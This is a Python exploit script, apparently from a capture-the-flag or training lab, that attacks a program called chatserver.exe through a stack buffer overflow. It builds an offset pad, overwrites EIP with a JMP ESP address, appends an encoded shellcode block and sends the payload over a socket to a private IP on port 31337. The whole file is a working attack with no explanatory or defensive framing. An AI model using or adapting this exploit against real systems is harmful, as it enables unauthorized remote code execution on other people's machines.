#!/usr/bin/python
'''Attacking chatserver.exe with bufferoverflow'''

import socket
import sys

ip = '10.10.145.162'
port = 31337
timeout = 5

buffer = 'A' * 146 ## OFFSET
buffer += '\xc3\x14\x04\x08' ## EIP
buffer += 'C' * 351 ## ESP
buffer += '' ## NOP

# BadChars \x0a
# ESP 0x080414C3 <<==>> \xc3\x14\x04\x08

buf = b""
buf += b"\xbf\x28\xb8\xcf\xd5\xda\xc0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
buf += b"\x52\x31\x78\x12\x03\x78\x12\x83\xe8\xbc\x2d\x20\x14\x54\x33"
buf += b"\xcb\xe4\xa5\x54\x45\x01\x94\x54\x31\x42\x87\x64\x31\x06\x24"
buf += b"\x0e\x17\xb2\xbf\x62\xb0\xb5\x08\xc8\xe6\xf8\x89\x61\xda\x9b"
buf += b"\x09\x78\x0f\x7b\x33\xb3\x42\x7a\x74\xae\xaf\x2e\x2d\xa4\x02"
buf += b"\xde\x5a\xf0\x9e\x55\x10\x14\xa7\x8a\xe1\x17\x86\x1d\x79\x4e"
buf += b"\x08\x9c\xae\xfa\x01\x86\xb3\xc7\xd8\x3d\x07\xb3\xda\x97\x59"
buf += b"\x3c\x70\xd6\x55\xcf\x88\x1f\x51\x30\xff\x69\xa1\xcd\xf8\xae"
buf += b"\xdb\x09\x8c\x34\x7b\xd9\x36\x90\x7d\x0e\xa0\x53\x71\xfb\xa6"
buf += b"\x3b\x96\xfa\x6b\x30\xa2\x77\x8a\x96\x22\xc3\xa9\x32\x6e\x97"
buf += b"\xd0\x63\xca\x76\xec\x73\xb5\x27\x48\xf8\x58\x33\xe1\xa3\x34"
buf += b"\xf0\xc8\x5b\xc5\x9e\x5b\x28\xf7\x01\xf0\xa6\xbb\xca\xde\x31"
buf += b"\xbb\xe0\xa7\xad\x42\x0b\xd8\xe4\x80\x5f\x88\x9e\x21\xe0\x43"
buf += b"\x5e\xcd\x35\xc3\x0e\x61\xe6\xa4\xfe\xc1\x56\x4d\x14\xce\x89"
buf += b"\x6d\x17\x04\xa2\x04\xe2\xcf\xc7\xd1\xee\x41\xb0\xe3\xee\x4c"
buf += b"\x1c\x6d\x08\x04\x8c\x3b\x83\xb1\x35\x66\x5f\x23\xb9\xbc\x1a"
buf += b"\x63\x31\x33\xdb\x2a\xb2\x3e\xcf\xdb\x32\x75\xad\x4a\x4c\xa3"
buf += b"\xd9\x11\xdf\x28\x19\x5f\xfc\xe6\x4e\x08\x32\xff\x1a\xa4\x6d"
buf += b"\xa9\x38\x35\xeb\x92\xf8\xe2\xc8\x1d\x01\x66\x74\x3a\x11\xbe"
buf += b"\x75\x06\x45\x6e\x20\xd0\x33\xc8\x9a\x92\xed\x82\x71\x7d\x79"
buf += b"\x52\xba\xbe\xff\x5b\x97\x48\x1f\xed\x4e\x0d\x20\xc2\x06\x99"
buf += b"\x59\x3e\xb7\x66\xb0\xfa\xd7\x84\x10\xf7\x7f\x11\xf1\xba\x1d"
buf += b"\xa2\x2c\xf8\x1b\x21\xc4\x81\xdf\x39\xad\x84\xa4\xfd\x5e\xf5"
buf += b"\xb5\x6b\x60\xaa\xb6\xb9"

string = bytes(buffer, 'latin-1')
string += buf

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(string + b'\r\n')
        s.recv(1024)

except Exception as e:
    print(e)
    sys.exit(0)

finally:
    s.close()
